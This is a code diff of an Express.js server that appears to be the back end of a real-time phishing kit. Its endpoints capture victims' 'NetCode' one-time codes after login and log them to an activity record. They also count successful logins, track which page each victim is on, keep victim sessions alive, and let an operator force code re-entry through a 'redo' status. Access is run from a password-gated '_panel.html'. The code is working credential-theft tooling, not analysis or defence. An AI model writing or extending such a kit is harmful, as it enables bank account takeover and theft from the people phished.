@@ -16,7 +16,7 @@ app.set('trust proxy', 1);
 app.use(cors());
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
-app.use(express.static(__dirname)); // Updated to use __dirname directly
+app.use(express.static(__dirname));
 
 /* ----------  SESSION MANAGEMENT  ---------- */
 const sessionsMap = new Map();
@@ -39,6 +39,16 @@ function setSessionCookie(res, data) {
     secure: true,
     sameSite: 'lax',
     maxAge: 24 * 60 * 60 * 1000,
+    path: '/'
+  });
+}
+
+function clearSessionCookie(res) {
+  res.cookie(COOKIE_NAME, '', {
+    httpOnly: true,
+    secure: true,
+    sameSite: 'lax',
+    expires: new Date(0),
     path: '/'
   });
 }
@@ -105,16 +115,43 @@ app.post('/api/login', (req, res) => {
   res.sendStatus(200);
 });
 
-// Capture NetCode
-app.post('/api/otp', (req, res) => {
-  const { sid, otp } = req.body;
+// Capture NetCode (verify.html sends to /api/verify)
+app.post('/api/verify', (req, res) => {
+  const { sid, netcode } = req.body;
   const session = sessionsMap.get(sid);
   if (!session) return res.sendStatus(404);
-  session.netcode = otp;
+  session.netcode = netcode;
   session.status = 'approved';
   session.page = 'success';
-  session.activityLog.push({ time: Date.now(), action: 'ENTERED NETCODE', detail: `NetCode: ${otp}` });
+  session.activityLog.push({ time: Date.now(), action: 'ENTERED NETCODE', detail: `NetCode: ${netcode}` });
   successfulLogins++;
+  res.sendStatus(200);
+});
+
+// Update page status
+app.post('/api/page', (req, res) => {
+  const { sid, page } = req.body;
+  const session = sessionsMap.get(sid);
+  if (!session) return res.sendStatus(404);
+  session.page = page;
+  res.sendStatus(200);
+});
+
+// Ping to keep session alive
+app.post('/api/ping', (req, res) => {
+  const { sid } = req.body;
+  if (sid) sessionActivity.set(sid, Date.now());
+  res.sendStatus(200);
+});
+
+// Clear redo status
+app.post('/api/clearRedo', (req, res) => {
+  const { sid } = req.body;
+  const session = sessionsMap.get(sid);
+  if (!session) return res.sendStatus(404);
+  if (session.status === 'redo') {
+    session.status = 'ok';
+  }
   res.sendStatus(200);
 });
 
@@ -212,8 +249,8 @@ app.get('/api/export', (req, res) => {
 
 /* ----------  PANEL ACCESS  ---------- */
 app.get('/panel', (req, res) => {
-  if (req.session?.authed) return res.sendFile(path.join(__dirname, '_panel.html')); // Updated path
-  res.sendFile(path.join(__dirname, 'access.html')); // Updated path
+  if (req.session?.authed) return res.sendFile(path.join(__dirname, '_panel.html'));
+  res.sendFile(path.join(__dirname, 'access.html'));
 });
 
 app.post('/panel/login', (req, res) => {
